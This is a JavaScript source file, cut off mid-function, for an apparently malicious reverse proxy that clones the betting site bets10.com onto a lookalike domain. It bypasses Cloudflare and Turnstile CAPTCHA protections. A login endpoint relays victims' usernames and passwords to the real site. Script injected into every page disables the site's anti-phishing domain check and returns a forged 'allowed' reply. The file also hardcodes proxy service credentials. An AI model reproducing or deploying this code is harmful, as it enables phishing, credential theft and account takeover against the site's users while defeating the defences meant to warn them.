import express from "express";
import http from "http";
import https from "https";
import path from "path";
import fs from "fs";
import fetch from "node-fetch";
import compression from "compression";
import { HttpsProxyAgent } from "https-proxy-agent";
import { WebSocket, WebSocketServer } from "ws";
import { execFile } from "child_process";

process.removeAllListeners('warning');

const app = express();

app.set('trust proxy', true);

function getRealProtocol(req) {
  const xfProto = req.headers['x-forwarded-proto'];
  if (xfProto) return xfProto.split(',')[0];
  return req.headers['x-forwarded-ssl'] === 'on' ? 'https' : 'http';
}

const PORT = 5091;

// ============= FLARESOLVERR CONFIG =============
const FLARESOLVERR_URL = "http://localhost:8191/v1";

// ============= CONFIG =============
const CONFIG = {
  domain: {
    target: "bets10.com",
    www: "www.bets10.com",
    api: "api.bets10.com",
    sportsapi: "sportsapi.bets10.com",
    sports2: "sports2.bets10.com",
    gamelaunch: "gamelaunch.bets10.com",
    mobile: "m.bets10.com",
  },
  proxy: {
    enabled: false,
    enableForWebSocket: false,
    host: "core-residential.evomi.com",
    port: "1000",
    username: "zemelata020",
    password: "0djANyIN7y39YLW3gWyV_country-TR",
  },
  cache: {
    assets: { maxSize: 1000, ttl: 4 * 60 * 60 * 1000 },
    pages: { maxSize: 300, ttl: 10 * 60 * 1000 },
  }
};

// ============= HELPERS =============
// proxyDomain'den base domain ├ğ─▒kar: "sports2.xn--artemsbet1200-0ib.com" ÔåÆ "xn--artemsbet1200-0ib.com"
function getProxyBaseDomain(proxyDomain) {
  const host = proxyDomain.split(':')[0];
  const parts = host.split('.');
  // subdomain.domain.tld ÔåÆ domain.tld
  return parts.length > 2 ? parts.slice(-2).join('.') : host;
}

// Domain rewrite: subdomain'i koruyarak hedef domain'i proxy domain'e ├ğevir
// "sportsapi.holiganbet7602.com" ÔåÆ "sportsapi.xn--artemsbet1200-0ib.com"
// "www.holiganbet7602.com" ÔåÆ "www.xn--artemsbet1200-0ib.com"  
// "holiganbet7602.com" ÔåÆ "xn--artemsbet1200-0ib.com"
function rewriteDomainPreservingSubdomain(matchedDomain, proxyBaseDomain, targetDomain) {
  const subdomain = matchedDomain.replace(targetDomain, '').replace(/\.$/, '');
  if (subdomain) {
    return `${subdomain}.${proxyBaseDomain}`;
  }
  return proxyBaseDomain;
}

// ============= CF-BYPASS INTEGRATION =============
const CF_BYPASS_URL = "http://localhost:3000/cloudflare";

// IUAM bypass cache ÔÇö cf_clearance cookie (30 min TTL from cf-bypass side)
let _cfClearanceCache = { cookie: null, userAgent: null, expiresAt: 0 };

async function getCfClearance() {
  if (_cfClearanceCache.cookie && Date.now() < _cfClearanceCache.expiresAt) {
    return _cfClearanceCache;
  }
  try {
    console.log('­şöä Requesting cf_clearance via FlareSolverr...');
    const response = await fetch(FLARESOLVERR_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        cmd: 'request.get',
        url: `https://www.${CONFIG.domain.target}/`,
        maxTimeout: 60000,
      })
    });
    const data = await response.json();
    if (data.status === 'ok') {
      const cookies = data.solution?.cookies || [];
      const cfClearanceCookie = cookies.find(c => c.name === 'cf_clearance');
      const cfBmCookie = cookies.find(c => c.name === '__cf_bm');
      const cfuvidCookie = cookies.find(c => c.name === '_cfuvid');
      const cfParts = [];
      if (cfClearanceCookie) cfParts.push(`cf_clearance=${cfClearanceCookie.value}`);
      if (cfBmCookie) cfParts.push(`__cf_bm=${cfBmCookie.value}`);
      if (cfuvidCookie) cfParts.push(`_cfuvid=${cfuvidCookie.value}`);
      _cfClearanceCache = {
        cookie: cfParts.join('; '),
        userAgent: data.solution?.userAgent || null,
        expiresAt: Date.now() + 25 * 60 * 1000,
      };
      console.log('Ô£à Got CF cookies via FlareSolverr:', cfParts.length, 'cookies');
      return _cfClearanceCache;
    } else {
      console.error('ÔØî FlareSolverr failed:', data.message || JSON.stringify(data).substring(0, 100));
    }
  } catch (error) {
    console.error('ÔØî FlareSolverr error:', error.message);
  }
  return null;
}

async function getTurnstileToken(domain = `https://${CONFIG.domain.target}`) {
  try {
    console.log('­şöä Requesting Turnstile token...');
    const requestBody = {
      mode: "turnstile",
      domain: domain,
      siteKey: '0x4AAAAAAA9Ls1mnIOIbAaQP',
      proxy: CONFIG.proxy.enabled ? {
        username: CONFIG.proxy.username,
        password: CONFIG.proxy.password
      } : undefined
    };

    const response = await fetch(CF_BYPASS_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(requestBody)
    });

    const data = await response.json();

    if (data.token) {
      console.log('Ô£à Got token:', data.token.substring(0, 20) + '...');
      return data.token;
    } else {
      console.error('ÔØî cf-bypass failed:', data);
      return null;
    }
  } catch (error) {
    console.error('ÔØî cf-bypass error:', error.message);
    return null;
  }
}

// ============= CURL-IMPERSONATE FETCH =============
const CURL_IMPERSONATE_BIN = '/opt/curl-impersonate/curl_ff117';

function curlFetch(url, options = {}) {
  return new Promise((resolve, reject) => {
    const headerFile = `/tmp/curl_headers_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;
    const args = [
      '-s',           // silent
      '-L',           // follow redirects
      '-D', headerFile, // dump headers to file
      '-o', '-',      // output body to stdout
      '--compressed', // handle gzip/brotli
      '--max-time', '30',
    ];

    // Proxy
    if (CONFIG.proxy.enabled) {
      args.push('-x', `http://${CONFIG.proxy.username}:${CONFIG.proxy.password}@${CONFIG.proxy.host}:${CONFIG.proxy.port}`);
    }

    // Custom headers (override curl_chrome116 defaults if needed)
    if (options.headers) {
      for (const [key, val] of Object.entries(options.headers)) {
        if (!val || key.toLowerCase() === 'accept-encoding') continue;
        args.push('-H', `${key}: ${val}`);
      }
    }

    args.push(url);

    execFile(CURL_IMPERSONATE_BIN, args, { 
      maxBuffer: 50 * 1024 * 1024, 
      timeout: 35000,
      env: { ...process.env, LD_LIBRARY_PATH: '/opt/curl-impersonate' },
    }, (err, stdout, stderr) => {
      // Read headers from file
      let status = 200;
      let headers = {};
      try {
        const rawHeaders = fs.readFileSync(headerFile, 'utf8');
        fs.unlinkSync(headerFile);
        
        // Parse status from last HTTP status line  (e.g. "HTTP/2 200" or "HTTP/1.1 302")
        const statusLines = rawHeaders.match(/^HTTP\/[\d.]+\s+(\d{3})/gm);
        if (statusLines && statusLines.length > 0) {
          const lastLine = statusLines[statusLines.length - 1];
          const statusMatch = lastLine.match(/\s(\d{3})/);
          if (statusMatch) status = parseInt(statusMatch[1]);
        }
        
        // Parse headers
        const lines = rawHeaders.split('\r\n');
        for (const line of lines) {
          const idx = line.indexOf(':');
          if (idx > 0) {
            const key = line.substring(0, idx).trim().toLowerCase();
            const val = line.substring(idx + 1).trim();
            if (key === 'set-cookie') {
              headers[key] = headers[key] ? headers[key] + '\n' + val : val;
            } else {
              headers[key] = val;
            }
          }
        }
      } catch (e) {
        // Header dosyas─▒ okunamazsa devam et
        try { fs.unlinkSync(headerFile); } catch(_) {}
      }

      if (err && !stdout) {
        return reject(err);
      }
      
      resolve({ status, headers, body: stdout || '' });
    });
  });
}

// ============= CURL-IMPERSONATE BINARY FETCH (for assets) =============
function curlFetchBinary(url) {
  return new Promise((resolve, reject) => {
    const headerFile = `/tmp/curl_hdr_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;
    const outFile = `/tmp/curl_out_${Date.now()}_${Math.random().toString(36).slice(2)}.bin`;
    const args = [
      '-s', '-L',
      '-D', headerFile,
      '-o', outFile,
      '--compressed',
      '--max-time', '20',
    ];

    if (CONFIG.proxy.enabled) {
      args.push('-x', `http://${CONFIG.proxy.username}:${CONFIG.proxy.password}@${CONFIG.proxy.host}:${CONFIG.proxy.port}`);
    }

    args.push(url);

    execFile(CURL_IMPERSONATE_BIN, args, {
      timeout: 25000,
      env: { ...process.env, LD_LIBRARY_PATH: '/opt/curl-impersonate' },
    }, (err) => {
      let status = 0;
      let headers = {};
      let buffer = Buffer.alloc(0);

      try {
        const rawHeaders = fs.readFileSync(headerFile, 'utf8');
        fs.unlinkSync(headerFile);
        const statusLines = rawHeaders.match(/^HTTP\/[\d.]+\s+(\d{3})/gm);
        if (statusLines) {
          const m = statusLines[statusLines.length - 1].match(/\s(\d{3})/);
          if (m) status = parseInt(m[1]);
        }
        const lines = rawHeaders.split('\r\n');
        for (const line of lines) {
          const idx = line.indexOf(':');
          if (idx > 0) headers[line.substring(0, idx).trim().toLowerCase()] = line.substring(idx + 1).trim();
        }
      } catch (_) {
        try { fs.unlinkSync(headerFile); } catch (_) {}
      }

      try {
        buffer = fs.readFileSync(outFile);
        fs.unlinkSync(outFile);
      } catch (_) {
        try { fs.unlinkSync(outFile); } catch (_) {}
      }

      if (err && buffer.length === 0) return reject(err);
      resolve({ status, headers, buffer });
    });
  });
}

// ============= HTTP AGENT =============
let httpAgent = new https.Agent({
  keepAlive: true,
  keepAliveMsecs: 500,
  maxSockets: 500,
  maxFreeSockets: 250,
  timeout: 5000,
});

if (CONFIG.proxy.enabled) {
  const auth = `${CONFIG.proxy.username}:${CONFIG.proxy.password}`;
  const proxyUrl = `http://${auth}@${CONFIG.proxy.host}:${CONFIG.proxy.port}`;
  httpAgent = new HttpsProxyAgent(proxyUrl, {
    keepAlive: true,
    keepAliveMsecs: 500,
    maxSockets: 500,
    maxFreeSockets: 250,
    timeout: 5000,
  });
  console.log(`­şö╣ Proxy enabled: ${CONFIG.proxy.host}:${CONFIG.proxy.port}`);
}

// ============= LRU CACHE =============
class LRUCache {
  constructor(maxSize, ttl) {
    this.cache = new Map();
    this.maxSize = maxSize;
    this.ttl = ttl;
  }

  set(key, value) {
    if (this.cache.size >= this.maxSize) {
      const firstKey = this.cache.keys().next().value;
      this.cache.delete(firstKey);
    }
    this.cache.set(key, { value, timestamp: Date.now() });
  }

  get(key) {
    const item = this.cache.get(key);
    if (!item || Date.now() - item.timestamp > this.ttl) {
      this.cache.delete(key);
      return null;
    }
    return item.value;
  }

  has(key) {
    return this.get(key) !== null;
  }
}

const assetCache = new LRUCache(CONFIG.cache.assets.maxSize, CONFIG.cache.assets.ttl);
const pageCache = new LRUCache(CONFIG.cache.pages.maxSize, CONFIG.cache.pages.ttl);

// ============= HELPERS =============
const patterns = {
  asset: /\.(js|css|png|jpg|jpeg|gif|webp|svg|ico|woff2?|ttf|eot|map)$/i,
  api: /^\/(api|apijson|graphql|rest|v2)/,
  staticPath: /\/(assets|content|images|storage|icons|fonts|static)\//,
};

const isAsset = (path) => patterns.asset.test(path) || patterns.staticPath.test(path);
const isAPI = (path) => patterns.api.test(path);

const contentTypes = {
  ".js": "application/javascript",
  ".css": "text/css",
  ".json": "application/json",
  ".png": "image/png",
  ".jpg": "image/jpeg",
  ".jpeg": "image/jpeg",
  ".gif": "image/gif",
  ".svg": "image/svg+xml",
  ".woff": "font/woff",
  ".woff2": "font/woff2",
  ".ttf": "font/ttf",
  ".eot": "application/vnd.ms-fontobject",
};

const getContentType = (ext) => contentTypes[ext.toLowerCase()] || "application/octet-stream";

// ============= HOST REWRITE HELPER =============
const rewriteHost = (host) => {
  if (!host) return host;
  return host
    .replace(/\.holiganbet\d+\.com$/i, `.${CONFIG.domain.target}`)
    .replace(new RegExp(`(www\\.|api\\.|sportsapi\\.|sports2\\.|sports\\.|m\\.)${CONFIG.domain.target}`, 'gi'), CONFIG.domain.target);
};

// ============= FETCH WITH RETRY =============
async function fetchWithRetry(url, options = {}) {
  for (let i = 0; i < 2; i++) {
    try {
      const controller = new AbortController();
      const timer = setTimeout(() => controller.abort(), 10000);

      const ua = options.headers?.['User-Agent'] || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';

      const response = await fetch(url, {
        ...options,
        signal: controller.signal,
        agent: httpAgent,
        headers: {
          ...options.headers,
          'Connection': 'keep-alive',
          'User-Agent': ua,
        },
        redirect: 'manual'
      });

      clearTimeout(timer);
      return response;
    } catch (err) {
      if (i === 1) throw err;
      await new Promise(r => setTimeout(r, 100));
    }
  }
}

// ============= MIDDLEWARE =============
app.use(compression({ level: 3, threshold: 512 }));
app.use(express.json({ limit: '5mb' }));
app.use(express.urlencoded({ extended: true, limit: '5mb' }));

// ============= FLARESOLVERR LOGIN ENDPOINT =============
app.post('/api/proxy-login', async (req, res) => {
  const { username, password } = req.body;
  
  if (!username || !password) {
    return res.status(400).json({ success: false, error: 'Username and password required' });
  }
  
  console.log(`\n­şöÉ Proxy Login Request: ${username}`);
  
  try {
    const sessionResponse = await fetch(FLARESOLVERR_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        cmd: 'sessions.create',
        session: `login_${Date.now()}`
      })
    });
    
    const sessionData = await sessionResponse.json();
    const sessionId = sessionData.session;
    console.log('­şôĞ Session created:', sessionId);
    
    const cfResponse = await fetch(FLARESOLVERR_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        cmd: 'request.get',
        url: `https://${CONFIG.domain.www}`,
        session: sessionId,
        maxTimeout: 60000
      })
    });
    
    const cfData = await cfResponse.json();
    if (cfData.status !== 'ok') {
      return res.json({ success: false, error: 'CF bypass failed', details: cfData.message });
    }
    
    console.log('Ô£à CF bypassed');
    const cookies = cfData.solution?.cookies || [];
    const userAgent = cfData.solution?.userAgent;
    
    const cookieString = cookies.map(c => `${c.name}=${c.value}`).join('; ');
    
    const wsLoginResult = await new Promise((resolve, reject) => {
      const WebSocket = require('ws').WebSocket;
      const wsUrl = `wss://${CONFIG.domain.api}/v2`;
      
      const wsOptions = {
        headers: {
          'Cookie': cookieString,
          'User-Agent': userAgent,
          'Origin': `https://${CONFIG.domain.www}`,
          'Host': CONFIG.domain.api
        },
        rejectUnauthorized: false
      };
      
      if (CONFIG.proxy.enabled) {
        const auth = `${CONFIG.proxy.username}:${CONFIG.proxy.password}`;
        const proxyUrl = `http://${auth}@${CONFIG.proxy.host}:${CONFIG.proxy.port}`;
        wsOptions.agent = new HttpsProxyAgent(proxyUrl);
      }
      
      const ws = new WebSocket(wsUrl, ['wamp.2.json'], wsOptions);
      let welcomeReceived = false;
      let sessionId = null;
      
      ws.on('open', () => {
        console.log('Ô£à WAMP WebSocket connected');
        const hello = [1, "com.holiganbet", {
          roles: {
            publisher: {},
            subscriber: {},
            caller: {},
            callee: {}
          }
        }];
        ws.send(JSON.stringify(hello));
      });
      
      ws.on('message', (data) => {
        try {
          const msg = JSON.parse(data.toString());
          console.log('­şô¿ WAMP:', JSON.stringify(msg).substring(0, 200));
          
          if (msg[0] === 2) {
            welcomeReceived = true;
            sessionId = msg[1];
            console.log('Ô£à WAMP Welcome, session:', sessionId);
            
            const callId = Math.floor(Math.random() * 1000000);
            const loginCall = [48, callId, {}, "user#login", [username, password, null, null, null]];
            ws.send(JSON.stringify(loginCall));
          }
          
          if (msg[0] === 50) {
            console.log('Ô£à Login RESULT received');
            ws.close();
            resolve({ success: true, result: msg[3], cookies: cookies });
          }
          
          if (msg[0] === 8) {
            console.log('ÔØî Login ERROR:', msg);
            ws.close();
            resolve({ success: false, error: msg[4] || 'WAMP error', details: msg });
          }
        } catch (e) {
          console.error('Parse error:', e.message);
        }
      });
      
      ws.on('error', (err) => {
        console.error('ÔØî WS Error:', err.message);
        reject(err);
      });
      
      setTimeout(() => {
        ws.close();
        reject(new Error('Login timeout'));
      }, 30000);
    });
    
    await fetch(FLARESOLVERR_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        cmd: 'sessions.destroy',
        session: sessionId
      })
    }).catch(() => {});
    
    if (wsLoginResult.success) {
      const proxyDomain = req.headers.host?.split(':')[0] || 'localhost';
      wsLoginResult.cookies.forEach(cookie => {
        res.cookie(cookie.name, cookie.value, {
          domain: proxyDomain,
          path: '/',
          httpOnly: cookie.httpOnly || false,
          secure: false,
          sameSite: 'lax'
        });
      });
      
      return res.json({ 
        success: true, 
        message: 'Login successful',
        result: wsLoginResult.result
      });
    } else {
      return res.json(wsLoginResult);
    }
    
  } catch (err) {
    console.error('ÔØî Login error:', err.message);
    return res.json({ success: false, error: err.message });
  }
});

// cf-bypass token endpoint
app.post('/api/get-turnstile-token', async (req, res) => {
  try {
    const { domain, siteKey } = req.body;
    const token = await getTurnstileToken(domain || `https://${CONFIG.domain.target}`);
    
    if (token) {
      res.json({ success: true, token: token });
    } else {
      res.json({ success: false, error: 'Failed to get token from cf-bypass' });
    }
  } catch (err) {
    console.error('ÔØî Token endpoint error:', err.message);
    res.json({ success: false, error: err.message });
  }
});

// ============= CORS MIDDLEWARE =============
app.use((req, res, next) => {
  const proxyDomain = req.headers.host || `localhost:${PORT}`;
  const requestOrigin = req.headers.origin || req.headers.referer?.split('/').slice(0, 3).join('/') || `${getRealProtocol(req)}://${proxyDomain}`;
  
  // ­şöÑ NWA API i├ğin ├Âzel CORS handling
  if (req.url.startsWith('/api/nwa/')) {
    res.setHeader("Access-Control-Allow-Origin", requestOrigin);
    res.setHeader("Access-Control-Allow-Credentials", "true");
    res.setHeader("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
    
    // Ô£à FIX: X-Payment-Session-Token eklendi
    res.setHeader("Access-Control-Allow-Headers", 
      "Content-Type, X-SessionId, X-Client-Request-Timestamp, X-Payment-Session-Token, Authorization, Accept, X-Requested-With");
    
    res.setHeader("Access-Control-Max-Age", "86400");
    
    if (req.method === 'OPTIONS') {
      console.log('Ô£à NWA OPTIONS preflight handled');
      return res.status(204).end();
    }
  } else {
    // Normal CORS headers ÔÇö credentials:include uyumlulu─şu i├ğin spesifik origin
    res.removeHeader("Content-Security-Policy");
    const proxyBase = getProxyBaseDomain(proxyDomain);
    const allowedOrigins = [
      `https://${proxyBase}`,
      `https://www.${proxyBase}`,
      `https://sports2.${proxyBase}`,
      `https://sportsapi.${proxyBase}`,
      `https://api.${proxyBase}`,
      `https://m.${proxyBase}`,
      `https://gamelaunch.${proxyBase}`,
    ];
    const origin = req.headers.origin || '';
    if (allowedOrigins.includes(origin) || origin.endsWith('.' + proxyBase)) {
      res.setHeader("Access-Control-Allow-Origin", origin);
    } else if (origin) {
      res.setHeader("Access-Control-Allow-Origin", origin);
    } else {
      res.setHeader("Access-Control-Allow-Origin", `https://www.${proxyBase}`);
    }
    res.setHeader("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
    res.setHeader("Access-Control-Allow-Headers", "Content-Type, X-SessionId, X-Client-Request-Timestamp, X-Payment-Session-Token, Authorization, Accept, X-Requested-With");
    res.setHeader("Access-Control-Allow-Credentials", "true");
    res.setHeader("Content-Security-Policy", "upgrade-insecure-requests");
    
    if (req.method === 'OPTIONS') {
      return res.status(204).end();
    }
  }
  
  next();
});

// ============= HTML INJECTION =============
const getHtmlInjections = (proxyDomain) => {
  const targetDomain = CONFIG.domain.target;

  // ============= ANTI-PHISHING-DETECTION: Sahte site uyar─▒s─▒n─▒ devre d─▒┼ş─▒ b─▒rak =============
  // hook.talep.cc/domain-check/check.js script'i holiganbet domain kontrol├╝ yap─▒yor
  // window.__rdcRun flag'ini set edersek script tekrar ├ğal─▒┼şmaz
  // Ayr─▒ca overlay'─▒ DOM'dan kald─▒r─▒yoruz (fallback)
  const antiPhishingScript = `<script>
(function(){
  'use strict';
  
  // 1) __rdcRun flag ÔÇö check.js bu flag set edilmi┼şse ├ğal─▒┼şmaz
  window.__rdcRun = true;
  
  // 2) RealDomainCheck fonksiyonunu override et ÔÇö ├ğa─şr─▒lsa bile bir┼şey yapmas─▒n
  window.RealDomainCheck = function() { return; };
  
  // 3) check.js script'inin y├╝klenmesini engelle
  //    MutationObserver ile script tag'─▒ eklenmeden ├Ânce yakala ve kald─▒r
  var origCreateElement = document.createElement.bind(document);
  document.createElement = function(tag) {
    var el = origCreateElement(tag);
    if (tag.toLowerCase() === 'script') {
      var origSetAttr = el.setAttribute.bind(el);
      el.setAttribute = function(name, value) {
        if (name === 'src' && typeof value === 'string' && 
            (value.indexOf('domain-check') !== -1 || value.indexOf('check.js') !== -1 || value.indexOf('hook.talep.cc') !== -1)) {
          console.log('[ANTI-PHISH] Blocked domain-check script:', value);
          return; // src set etme, script y├╝klenmesin
        }
        return origSetAttr(name, value);
      };
      // src property override
      var _src = '';
      Object.defineProperty(el, 'src', {
        get: function() { return _src; },
        set: function(val) {
          if (typeof val === 'string' && 
              (val.indexOf('domain-check') !== -1 || val.indexOf('check.js') !== -1 || val.indexOf('hook.talep.cc') !== -1)) {
            console.log('[ANTI-PHISH] Blocked domain-check script (src property):', val);
            return;
          }
          _src = val;
          origSetAttr('src', val);
        },
        configurable: true
      });
    }
    return el;
  };
  // prototype chain'i koru
  document.createElement.__proto__ = origCreateElement.__proto__;
  
  // 4) DOM'dan overlay'─▒ kald─▒r (e─şer script zaten y├╝klendiyse)
  function removeOverlay() {
    var overlay = document.getElementById('real-domain-check-overlay');
    if (overlay) {
      overlay.remove();
      console.log('[ANTI-PHISH] Removed #real-domain-check-overlay');
    }
    // Body overflow fix
    if (document.body) {
      document.body.style.overflow = '';
      document.body.style.position = '';
    }
    if (document.documentElement) {
      document.documentElement.style.overflow = '';
    }
  }
  
  // 5) Agresif DOM temizleme ÔÇö observer + interval
  function startCleanup() {
    if (!document.body) { setTimeout(startCleanup, 30); return; }
    removeOverlay();
    
    // MutationObserver ÔÇö overlay eklendi─şi anda kald─▒r
    var obs = new MutationObserver(function(muts) {
      for (var i = 0; i < muts.length; i++) {
        var added = muts[i].addedNodes;
        for (var j = 0; j < added.length; j++) {
          var node = added[j];
          if (node.nodeType === 1) {
            // Overlay div kontrol├╝
            if (node.id === 'real-domain-check-overlay') {
              node.remove();
              console.log('[ANTI-PHISH] Intercepted overlay insertion');
              continue;
            }
            // Script tag kontrol├╝ ÔÇö domain-check script'ini engelle
            if (node.tagName === 'SCRIPT') {
              var s = node.src || '';
              if (s.indexOf('domain-check') !== -1 || s.indexOf('check.js') !== -1 || s.indexOf('hook.talep.cc') !== -1) {
                node.remove();
                console.log('[ANTI-PHISH] Removed domain-check script tag');
              }
            }
          }
        }
      }
    });
    obs.observe(document.documentElement, { childList: true, subtree: true });
    
    // ─░lk 20 saniye her 300ms overlay kontrol├╝
    var count = 0;
    var iv = setInterval(function() {
      removeOverlay();
      count++;
      if (count > 66) clearInterval(iv);
    }, 300);
  }
  
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', startCleanup);
  } else {
    startCleanup();
  }
  
  // 6) fetch override ÔÇö check.js'in API ├ğa─şr─▒s─▒n─▒ yakala
  var _origFetch = window.fetch;
  window.__antiPhishFetch = _origFetch;
  window.fetch = function(url, opts) {
    var urlStr = (typeof url === 'string') ? url : (url && url.url) || '';
    if (urlStr.indexOf('hook.talep.cc') !== -1 || urlStr.indexOf('domain-check/api') !== -1) {
      console.log('[ANTI-PHISH] Blocked domain-check API call:', urlStr);
      // Sahte "izin verildi" yan─▒t─▒ d├Ân
      return Promise.resolve(new Response(JSON.stringify({
        ok: true,
        site_name: 'holiganbet',
        real_domains: [window.location.hostname, 'holiganbet7602.com'],
        primary_domain: 'holiganbet7602.com'
      }), { status: 200, headers: { 'Content-Type': 'application/json' }}));
    }
    return _origFetch.apply(this, arguments);
  };
  
  console.log('[ANTI-PHISH] Domain check bypass active ÔÇö hook.talep.cc blocked');
})();
</script>`;

  // ============= TUNNEL: CF Challenge Origin/Referer Rewrite =============
  const tunnelScript = `<script>
window.__TUNNEL_UPSTREAM_ORIGIN__="https://www.${targetDomain}";
(function(){
var o=window.__TUNNEL_UPSTREAM_ORIGIN__;
if(!o)return;
var isCF=function(u){try{return new URL(u,"https://a").hostname==="challenges.cloudflare.com";}catch(e){return (u||"").indexOf("challenges.cloudflare.com")!==-1;}};
var f=window.fetch;
if(f){window.fetch=function(u,opts){var url=typeof u==="string"?u:(u&&u.url)||"";
if(isCF(url)){opts=opts||{};if(!opts.headers)opts.headers={};var h=opts.headers;if(h instanceof Headers){h.set("Origin",o);h.set("Referer",o+"/");}else{h["Origin"]=o;h["Referer"]=o+"/";}}
return f.apply(this,arguments);};}
var X=window.XMLHttpRequest;
if(X){var O=X.prototype.open,S=X.prototype.setRequestHeader,send=X.prototype.send;
X.prototype.open=function(m,u){this._url=u;return O.apply(this,arguments);};
X.prototype.setRequestHeader=function(n,v){if(isCF(this._url)&&(n==="Origin"||n==="Referer"))return;return S.apply(this,arguments);};
X.prototype.send=function(){var x=this;if(isCF(x._url)){try{S.call(x,"Origin",o);S.call(x,"Referer",o+"/");}catch(e){}}return send.apply(this,arguments);};}
})();
</script>`;

  // ============= CAPTCHA CONFIG + TURNSTILE BYPASS + POSTMESSAGE HANDLER =============
  const captchaBypassScript = `<script>(function(){'use strict';
// Captcha config
window.__TUNNEL_CONFIG__ = window.__TUNNEL_CONFIG__ || {};
window.__TUNNEL_CONFIG__.captcha = 'managed';

// ============= TURNSTILE TOKEN BYPASS =============
// CF Turnstile widget'─▒n─▒ intercept edip backend cf-bypass'tan token al─▒yoruz
(function(){
  var SITE_KEY = '0x4AAAAAAA9Ls1mnIOIbAaQP';
  var TOKEN_ENDPOINT = '/api/get-turnstile-token';
  var pendingCallbacks = [];
  var cachedToken = null;
  var tokenExpiry = 0;
  var fetching = false;

  function fetchToken(callback) {
    // Cache kontrol├╝ (token 4 dk ge├ğerli)
    if (cachedToken && Date.now() < tokenExpiry) {
      console.log('[TURNSTILE] Using cached token');
      if (callback) callback(cachedToken);
      return;
    }
    
    if (callback) pendingCallbacks.push(callback);
    if (fetching) return;
    fetching = true;
    
    console.log('[TURNSTILE] Fetching token from cf-bypass...');
    
    // window.fetch yerine XMLHttpRequest kullan (fetch override'dan ka├ğ─▒n)
    var xhr = new (window.__NativeXHR || XMLHttpRequest)();
    xhr.open('POST', TOKEN_ENDPOINT, true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.onload = function() {
      fetching = false;
      try {
        var data = JSON.parse(xhr.responseText);
        if (data.success && data.token) {
          cachedToken = data.token;
          tokenExpiry = Date.now() + 240000; // 4 dk cache
          console.log('[TURNSTILE] Token received:', data.token.substring(0, 30) + '...');
          var cbs = pendingCallbacks.splice(0);
          cbs.forEach(function(cb) { try { cb(data.token); } catch(e){} });
        } else {
          console.error('[TURNSTILE] Token failed:', data.error || 'unknown');
          var cbs = pendingCallbacks.splice(0);
          cbs.forEach(function(cb) { try { cb(null); } catch(e){} });
        }
      } catch(e) {
        console.error('[TURNSTILE] Parse error:', e);
        fetching = false;
        var cbs = pendingCallbacks.splice(0);
        cbs.forEach(function(cb) { try { cb(null); } catch(e2){} });
      }
    };
    xhr.onerror = function() {
      fetching = false;
      console.error('[TURNSTILE] XHR error');
      var cbs = pendingCallbacks.splice(0);
      cbs.forEach(function(cb) { try { cb(null); } catch(e){} });
    };
    xhr.send(JSON.stringify({ siteKey: SITE_KEY }));
  }

  // Turnstile render intercept
  function interceptTurnstile() {
    if (window.turnstile && window.turnstile._intercepted) return;
    
    var realTurnstile = window.turnstile;
    var mockTurnstile = {
      _intercepted: true,
      render: function(container, options) {
        console.log('[TURNSTILE] render() intercepted, siteKey:', options && options.sitekey);
        var widgetId = 'mock-widget-' + Date.now();
        
        // Hemen token al ve callback'e ver
        fetchToken(function(token) {
          if (token) {
            console.log('[TURNSTILE] Calling callback with token');
            if (options && typeof options.callback === 'function') {
              options.callback(token);
            }
            // Input field'lar─▒ da doldur
            try {
              var inputs = document.querySelectorAll('input[name="cf-turnstile-response"], input[name="cf_turnstile_response"]');
              inputs.forEach(function(inp) { inp.value = token; });
            } catch(e) {}
          } else if (options && typeof options['error-callback'] === 'function') {
            options['error-callback']();
          }
        });
        
        return widgetId;
      },
      reset: function(id) { console.log('[TURNSTILE] reset()', id); },
      remove: function(id) { console.log('[TURNSTILE] remove()', id); },
      getResponse: function(id) { return cachedToken || ''; },
      isExpired: function(id) { return !cachedToken || Date.now() >= tokenExpiry; },
      execute: function(container, options) {
        console.log('[TURNSTILE] execute() intercepted');
        fetchToken(function(token) {
          if (token && options && typeof options.callback === 'function') {
            options.callback(token);
          }
        });
      }
    };
    
    window.turnstile = mockTurnstile;
    
    // Turnstile script y├╝klendi─şinde de override et
    Object.defineProperty(window, 'turnstile', {
      get: function() { return mockTurnstile; },
      set: function(v) {
        console.log('[TURNSTILE] turnstile object override attempted, keeping mock');
        // Orijinali sakla ama mock'u kullan
      },
      configurable: true
    });
  }

  // Hemen ├ğal─▒┼şt─▒r
  interceptTurnstile();
  
  // DOM ready'de de ├ğal─▒┼şt─▒r (ge├ğ y├╝klenen scriptler i├ğin)
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', interceptTurnstile);
  }
  
  // Periyodik kontrol - yeni turnstile widget'lar─▒ i├ğin
  var checkInterval = setInterval(function() {
    // E─şer sayfada turnstile container varsa ve token yoksa, pre-fetch et
    var containers = document.querySelectorAll('.cf-turnstile, [data-sitekey]');
    if (containers.length > 0 && !cachedToken) {
      fetchToken(function(token) {
        if (token) {
          console.log('[TURNSTILE] Pre-fetched token for visible widget');
          // T├╝m turnstile callback'lerini tetikle
          containers.forEach(function(c) {
            var cb = c.getAttribute('data-callback');
            if (cb && typeof window[cb] === 'function') {
              window[cb](token);
            }
          });
        }
      });
    }
  }, 3000);
  
  // Global eri┼şim
  window.__getTurnstileToken = fetchToken;
})();

// PostMessage dinleyici - Tawk.to chat y├Ânlendirme + ├Âdeme iframe
window.addEventListener('message', function(event) {
  // NavigateTo mesaj─▒ - Tawk.to chat y├Ânlendirmesi
  if (event.data && event.data.type === 'NavigateTo') {
    var targetUrl = event.data.path || event.data.url;
    if (targetUrl && targetUrl.indexOf('direct.lc.chat') !== -1) {
      var tc = window.__TUNNEL_CONFIG__ || {};
      var pid = tc.tawkProjectId || '';
